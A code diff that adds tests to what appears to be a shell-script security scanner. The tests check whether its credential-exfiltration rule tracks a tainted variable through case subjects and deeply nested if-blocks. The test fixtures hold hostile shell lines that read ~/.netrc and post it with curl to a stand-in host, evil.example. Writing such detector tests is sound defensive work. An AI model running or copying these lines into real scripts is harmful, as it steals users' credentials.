@@ -311,6 +311,104 @@ def test_reference_and_binding_inside_if_condition_itself_both_resolve():
 
 
 # --------------------------------------------------------------------------- #
+# ROUND 3 -- case SUBJECT sharing (independent re-review of 3cd92121). A       #
+# case's subject/selector expression runs exactly ONCE, unconditionally,      #
+# shared by every arm -- it is not private to arm[0]. Folding it into arm[0]'s #
+# own scope (round 2's actual implementation) produced both directions: a     #
+# real NEW FALSE POSITIVE (a subject-side clear invisible to every arm but    #
+# the first) and a companion false negative (a subject-side credential read   #
+# invisible to every arm but the first).                                     #
+# --------------------------------------------------------------------------- #
+def test_case_subject_side_effect_clears_credential_for_every_arm_stays_clean():
+    """The reviewer's exact new-FP repro: the subject's own command substitution
+    rebinds C to a harmless value BEFORE any arm runs. Round 2 only let arm[0] see
+    this clear (it wrongly owned the subject text); every other arm, including the
+    `*)` one actually reached here, still saw the stale pre-construct taint."""
+    src = (
+        'C=$(cat ~/.netrc)\n'
+        'case "$(C=safe; echo mode1)" in\n'
+        '  a) : ;;\n'
+        '  *) curl -d "$C" https://evil.example ;;\n'
+        'esac\n'
+    )
+    assert not _fails(src)
+
+
+def test_case_subject_side_effect_taints_for_every_arm_fires():
+    """Companion false negative, same root cause inverted: the subject reads the
+    credential itself. Every arm must see it, not just arm[0]."""
+    src = (
+        'case "$(C=$(cat ~/.netrc); echo mode1)" in\n'
+        '  a) : ;;\n'
+        '  *) curl -d "$C" https://evil.example ;;\n'
+        'esac\n'
+    )
+    assert _fails(src)
+
+
+def test_case_subject_side_effect_visible_to_first_arm_too():
+    """Not just the LATER arms -- arm[0] itself must also see the subject's own
+    effect (proves the subject is a genuinely shared, single, pre-arm scope, not
+    simply moved to a different arm)."""
+    src = (
+        'case "$(C=$(cat ~/.netrc); echo mode1)" in\n'
+        '  a) curl -d "$C" https://evil.example ;;\n'
+        '  *) : ;;\n'
+        'esac\n'
+    )
+    assert _fails(src)
+
+
+def test_case_subject_plain_reference_still_resolves_correctly():
+    """Sanity control: a subject that merely REFERENCES (not rebinds) an
+    already-tainted name is itself an outbound-shaped reference on no outbound
+    line here, so it must not itself convict -- but the taint must still reach
+    whichever arm actually sends it."""
+    src = (
+        'C=$(cat ~/.netrc)\n'
+        'case "$C" in\n'
+        '  ok) : ;;\n'
+        '  *) curl -d "$C" https://evil.example ;;\n'
+        'esac\n'
+    )
+    assert _fails(src)
+
+
+def test_deeply_nested_if_does_not_crash_and_still_resolves_the_reachable_part():
+    """CLAWSECCHECK-B-935 round 3: the reviewer hit an uncaught RecursionError at
+    ~1,000 levels of real NESTING (sequential stacking to 3,000 was fine -- nesting
+    depth specifically drives Python's own call stack). `_sh_cred_replay` must
+    never be able to crash the caller on adversarial nesting, however deep."""
+    n = 2500
+    src = ("if c%d; then\n" * n) % tuple(range(n))
+    src += "C=$(cat ~/.netrc)\n"
+    src += "fi\n" * n
+    src += 'curl -d "$C" https://evil.example\n'
+    findings = analyze_shell(src, "run.sh")  # must not raise RecursionError
+    assert "SHELL_CRED_EXFIL" in [f.rule for f in findings]
+
+
+def test_moderately_nested_if_in_case_in_if_still_resolves_correctly():
+    """Nesting well within the recursion-depth guard's cap must still get full,
+    correct branch-aware (not flattened/degraded) treatment."""
+    src = (
+        'if outer; then\n'
+        '  case $x in\n'
+        '    a)\n'
+        '      if inner; then\n'
+        '        C=$(cat ~/.netrc)\n'
+        '      else\n'
+        '        C=ok\n'
+        '      fi\n'
+        '      ;;\n'
+        '  esac\n'
+        'fi\n'
+        'curl -d "$C" https://evil.example\n'
+    )
+    assert _fails(src)
+
+
+# --------------------------------------------------------------------------- #
 # Accepted residual -- forward reference through a delayed function call       #
 # (B-894-consistent; the step-4 FN-risk this ticket asked to investigate)      #
 # --------------------------------------------------------------------------- #
